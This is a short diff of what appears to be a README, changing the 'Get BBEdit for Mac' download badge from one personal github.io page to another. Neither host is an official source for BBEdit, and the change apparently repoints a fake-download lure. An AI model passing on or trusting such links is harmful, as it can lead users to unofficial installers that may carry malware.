@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://manhyusuu48.github.io/.github/BBEdit">  
+<a href="https://tembilamusion.github.io/.github/BBEdit">  
 <img src="https://img.shields.io/badge/💻_Get_BBEdit-007ACC?style=for-the-badge&logo=apple&logoColor=white" alt="Get BBEdit for Mac">  
 </a>  
 </div>  
